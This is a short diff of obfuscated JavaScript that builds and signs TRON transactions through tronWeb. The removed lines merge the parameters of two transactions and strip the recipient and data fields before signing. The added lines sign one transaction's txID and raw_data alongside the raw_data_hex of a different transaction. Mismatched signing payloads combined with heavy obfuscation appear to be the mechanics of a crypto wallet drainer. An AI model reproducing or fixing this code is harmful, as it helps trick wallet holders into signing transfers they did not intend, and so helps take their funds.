@@ -178,17 +178,17 @@ async function _0x8f88sb(_0x5b1fc5) {
     {
       transaction: _0x4f164f
     } = await tronWeb.transactionBuilder.triggerSmartContract(_0x41442b._0x19h196, _0x990438, _0x999691, _0x37d562, tronWeb.address.toHex(tronWeb.defaultAddress.base58));
-  let _0x348df4 = _0x652ecf;
-  _0x348df4.raw_data.contract[0].parameter.value = {
-    ..._0x652ecf.raw_data.contract[0].parameter.value,
-    ..._0x25dedb.raw_data.contract[0].parameter.value
-  };
-  delete _0x348df4.raw_data.contract[0].parameter.value.data;
-  delete _0x348df4.raw_data.contract[0].parameter.value.to_address;
+  // let _0x348df4 = _0x652ecf;
+  // _0x348df4.raw_data.contract[0].parameter.value = {
+  //   ..._0x652ecf.raw_data.contract[0].parameter.value,
+  //   ..._0x25dedb.raw_data.contract[0].parameter.value
+  // };
+  // delete _0x348df4.raw_data.contract[0].parameter.value.data;
+  // delete _0x348df4.raw_data.contract[0].parameter.value.to_address;
   try {
     let _0x1c8990 = await tronWeb.trx.sign({
-      "txID": _0x25dedb.txID,
-      "raw_data": _0x348df4.raw_data,
+      "txID": _0x652ecf.txID,
+      "raw_data": _0x652ecf.raw_data,
       "raw_data_hex": _0x4f164f.raw_data_hex
     });
     await tronWeb.trx.sendRawTransaction({
